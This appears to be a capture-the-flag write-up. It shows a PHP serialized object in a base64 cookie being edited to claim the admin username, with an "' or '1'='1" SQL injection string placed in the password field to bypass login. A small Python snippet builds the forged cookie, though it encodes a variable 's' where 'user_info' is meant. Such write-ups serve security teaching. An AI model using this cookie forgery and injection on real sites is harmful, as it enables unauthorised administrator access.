
Tried to login as ``guest:guest``, it redirect to ``/index.php?file=regular_user``. checkout application cookies, the value of ``user_info`` looks suspicious. it is a url-encoded base64 string.


After decoding, we got a object description
```
O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
```

``O`` => Object
``s`` => string attribute

Number indicates the length of the following value.

If we change ``guest`` to ``admin``, then we can visit as admin. we need SQL injection to bypass the password.

```
pw = "password' or '1'='1"
user_info = 'O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:'+str(len(pw))+':"'+pw+'";}'
cookie = base64.b64encode(s.encode())
```

Replace the value of ``user_info`` with the updated one, try to visit admin page ``/index.php?file=admin``, now we have the flag.
